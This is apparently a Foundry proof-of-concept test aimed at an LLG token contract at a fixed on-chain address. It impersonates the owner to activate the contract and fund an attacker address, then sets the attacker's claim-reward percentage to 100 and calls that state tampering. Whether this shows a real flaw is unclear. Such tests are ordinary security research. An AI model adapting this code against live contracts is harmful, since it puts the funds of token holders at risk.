// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LLG {
    function activate() external;
    function setClaimRewardAsTokensPercentage(uint256 percentage) external;
    function claimRewardAsTokensPercentage(address ofAddress) external view returns(uint256);
    function minRewardBalance() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE4C293Eadbb9d72d68a680F1A66979726992c396;
    address attacker = address(this);
    address owner = LLG(TARGET).owner();

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Impersonate owner to activate contract
        vm.startPrank(owner);
        LLG(TARGET).activate();
        vm.stopPrank();

        // Get minRewardBalance value
        uint256 minRewardBalance = LLG(TARGET).minRewardBalance();

        // Give attacker enough LLG tokens to meet minRewardBalance requirement
        // First, get some LLG tokens from the owner
        vm.prank(owner);
        LLG(TARGET).transfer(attacker, minRewardBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Call the vulnerable function to set claim reward percentage to 100%
        LLG(TARGET).setClaimRewardAsTokensPercentage(100);

        // Verify the percentage was set to 100
        uint256 percentage = LLG(TARGET).claimRewardAsTokensPercentage(attacker);
        assertEq(percentage, 100, "Percentage should be set to 100");
        assertEq(LLG(TARGET).claimRewardAsTokensPercentage(attacker), 100, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
